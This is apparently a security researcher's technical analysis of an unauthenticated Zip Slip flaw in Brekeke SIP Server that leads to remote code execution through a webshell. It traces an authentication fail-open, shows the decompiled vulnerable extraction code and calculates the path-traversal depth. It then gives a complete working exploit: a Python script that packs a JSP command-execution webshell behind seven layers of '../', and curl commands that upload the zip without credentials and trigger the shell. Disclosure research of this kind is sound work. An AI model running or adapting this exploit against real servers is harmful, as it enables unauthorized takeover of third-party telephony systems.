# Brekeke SIP Server Unauthenticated Zip Slip Webshell RCE - Technical Analysis

## Overview

Brekeke SIP Server v3.19.1.8p1 ships a self-developed authentication framework that fails open for any bean that has not declared a scope, plus a `GateServlet` dispatcher where the `bean` request parameter is attacker-controlled. Twenty-three beans with undeclared scopes become reachable without authentication. One of them, `ProvisioningModelImport`, uploads a zip and decompresses it through a self-developed `Zip.extractAll` that performs no `..` filtering or canonical-path validation. A single unauthenticated POST writes a JSP webshell through seven layers of path traversal into the webroot, and a single GET triggers it — remote code execution as the `tomcat` user, with no prerequisites, in the factory default configuration.

## Product Background

| Item | Value |
|------|-------|
| Product | Brekeke SIP Server (SIP Proxy / SIP Registrar) |
| Vendor | Brekeke Software, Inc. (US California / Japan Okinawa R&D) |
| Version | v3.19.1.8p1 (Evaluation Edition, built 2026-06-24) |
| Architecture | Java Servlet (sip.war 20.5 MB) on Tomcat 9.0.87 + Java 17 |
| Self-developed components | ondosip.jar (SIP stack) / ondooss.jar (business + Command bean) / ondoutil.jar (GateServlet/Bean/auth framework) |

## Authentication Primitive

This chain builds on the authentication fail-open primitive: `ScopeBean.checkScope()` admits any bean that has not declared a scope via `setCheckScope()`, and the `GateServlet` `bean` parameter is attacker-controlled, so 23 beans are reachable without authentication. `ProvisioningModelImport` is one of them.

```bash
curl -s -o /dev/null -w "%{http_code}" \
  "http://127.0.0.1:8080/sip/gate?bean=sipadmin.web.ProvisioningModelImport"
# -> 200 (unauthenticated reachable)
```

## Sink Identification

### ProvisioningModelImport.exec() (ondooss.jar)

```java
// com.brekeke.sipadmin.web.ProvisioningModelImport extends Provisioning
@Override
protected boolean exec() throws IOException {
    String string = this.getParam("operation", "");
    if (string.equals("import")) {
        FileData fileData = this.getFileDataParam("modelfile", null);   // <- uploaded zip
        String string2 = fileData.getFileName();
        String string3 = string2.substring(0, string2.lastIndexOf("."));
        String string4 = this.getParam("model", "");
        String string5 = string4.equals("") ? string3 : string4;        // model name
        boolean bl = this.getParam("overwrite", "true").equals("true");
        switch (ProvisioningModelManager.checkModel(string5)) {
            case MODEL_EXIST:
                if (bl) break;   // overwrite=true then overwrite
                ...
        }
        if (this.message.equals("") &&
            ProvisioningModelManager.ModelManagerResult.MODEL_OK !=
                (modelManagerResult = ProvisioningModelManager.importModel(string5, fileData, true))) {
            ...
        }
    }
}
```

### ProvisioningModelManager.importModel() (ondooss.jar)

```java
// com.brekeke.sipadmin.web.ProvisioningModelManager
public static ModelManagerResult importModel(String string, FileData fileData, boolean bl) {
    String string2 = FileUtil.encodeFileName(string, "UTF8");
    synchronized (ProvisioningModelManager.class) {
        String string3 = Provisioning.getPathModels() + "/" + string2;   // <- extract root = etc/pv/models/<model>/
        File file = new File(string3);
        if (file.exists()) {
            ProvisioningModelManager.deleteModel(string, bl);
        }
        if (!file.mkdirs()) {
            return ModelManagerResult.MODEL_MKDIR_ERROR;
        }
        File file2 = fileData.getFile();
        try {
            Zip.extractAll((File)file2, (File)file);   // <- extract to etc/pv/models/<model>/, no validation
            ProvisioningModelManager.updatedNotify("u-pv,m," + string2);
        }
        catch (IOException iOException) {
            return ModelManagerResult.MODEL_ZIPERROR;
        }
        return ModelManagerResult.MODEL_OK;
    }
}
```

### Zip.extractAll() (ondoutil.jar) — Zip Slip root cause

```java
// com.brekeke.util.Zip
public static void extractAll(File file, File file2) throws IOException {
    FileInputStream fileInputStream = null;
    ZipInputStream zipInputStream = null;
    FileOutputStream fileOutputStream = null;
    try {
        fileInputStream = new FileInputStream(file);
        zipInputStream = new ZipInputStream(fileInputStream);
        ZipEntry zipEntry = null;
        while ((zipEntry = zipInputStream.getNextEntry()) != null) {
            Object object;
            if (zipEntry.isDirectory()) {
                object = new File(file2 + "/" + zipEntry.getName());   // <- direct concat, no canonical check
                ((File)object).mkdirs();
                continue;
            }
            object = file2 + "/" + zipEntry.getName();                 // <- direct concat of entry name, includes ../
            File file3 = new File((String)object);
            try {
                new File(StringUtil.getLeftLastOf(
                    StringUtil.replace((String)object, "\\", "/"), "/")).mkdirs();  // build parent dirs (incl. traversal path)
                fileOutputStream = new FileOutputStream((String)object);            // <- write to traversed path
                IOUtil.inToOut(zipInputStream, fileOutputStream);                   // write file content
            }
            ...
        }
    }
    ...
}
```

**Defect root cause**:

1. `object = file2 + "/" + zipEntry.getName()` — direct concatenation of extract root + zip entry name, **no `..` filtering, no canonical-path validation**.
2. `new File(...).mkdirs()` — creates every directory along the traversal path.
3. `new FileOutputStream((String)object)` — writes the zip entry content to an arbitrary traversed path.

This is a classic **Zip Slip (CWE-22 path traversal)**: a malicious zip entry name containing `../` escapes the target directory during extraction and writes an arbitrary file.

## Path Calculation

### Extract root

```
file2 = Provisioning.getPathModels() + "/" + encodeFileName(model)
      = <war>/WEB-INF/work/sv/etc/pv/models/<model>/
```

### Traversal depth

From `etc/pv/models/<model>/` to the webroot `<war>/` (i.e. `webapps/sip/`):

```
etc/pv/models/<model>/   <- extract root
  ../                     -> etc/pv/models/
  ../../                  -> etc/pv/
  ../../../                -> etc/
  ../../../../             -> work/sv/   (WEB-INF/work/sv/)
  ../../../../../          -> WEB-INF/
  ../../../../../../        -> webapps/sip/  <- webroot
```

The actual deployment path contains `WEB-INF/work/sv/etc/pv/models/<model>/`, so **7 layers of `../`** are required to reach the webroot root.

A 6-layer `../` lands in `WEB-INF/`, and Tomcat forbids direct access to JSPs under `WEB-INF/` (404), so 7 layers to the webroot root are mandatory.

## Dynamic Verification: Single-Request Webshell RCE

### Build the malicious zip

```python
import zipfile
ws = '<%@ page import="java.io.*" %>' \
     '<% String c = request.getParameter("c");' \
     ' if(c!=null){ Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",c});' \
     ' BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));' \
     ' String l; while((l=br.readLine())!=null) out.println(l); } %>'
with zipfile.ZipFile('/tmp/poc.zip', 'w') as z:
    z.writestr("../../../../../../../unauth_webshell.jsp", ws)   # 7 layers ../ to webroot
```

### Unauthenticated upload + trigger

```bash
# Step 1: unauthenticated webshell upload (Zip Slip writes into webroot)
curl -s -o /dev/null -w "%{http_code}" \
  -F "operation=import" -F "model=poc" -F "overwrite=true" \
  -F "modelfile=@/tmp/poc.zip;filename=poc.zip" \
  "http://127.0.0.1:8080/sip/gate?bean=sipadmin.web.ProvisioningModelImport"
# -> 200

# Step 2: GET to trigger the webshell
curl -s "http://127.0.0.1:8080/sip/unauth_webshell.jsp?c=id"
```

### Result

```
--- id ---
uid=53(tomcat) gid=53(tomcat) groups=53(tomcat)
--- whoami ---
tomcat
```

**One POST + one GET, no credentials, RCE as `tomcat`** confirmed.

## Pristine Default-Configuration Confirmation

To rule out test-time configuration residue, a pristine fresh deployment was verified:

1. Delete the already-deployed `webapps/sip/` directory.
2. Restart Tomcat (re-deploy from the original `sip.war`).
3. Confirm `etc/pv/` contains only `models/scripts/logs/command/config.properties` by default, **no `temp/`**.
4. Re-run the single-request webshell RCE -> `id` -> `uid=53(tomcat)` confirmed.

**Conclusion**: the vulnerability is exploitable with no prerequisites in the factory default configuration. The webshell path does not depend on the temp directory.

## Complete Attack Sequence

1. **Build the malicious zip**: a JSP webshell as a zip entry named with 7 layers of `../` to traverse from the extract root to the webroot
2. **Upload unauthenticated**: POST the zip to `ProvisioningModelImport` with `operation=import` (unauthenticated via fail-open) — `Zip.extractAll` writes the webshell into the webroot
3. **Trigger the webshell**: GET the webshell URL with the command parameter — the command executes as `tomcat` and output is returned in the response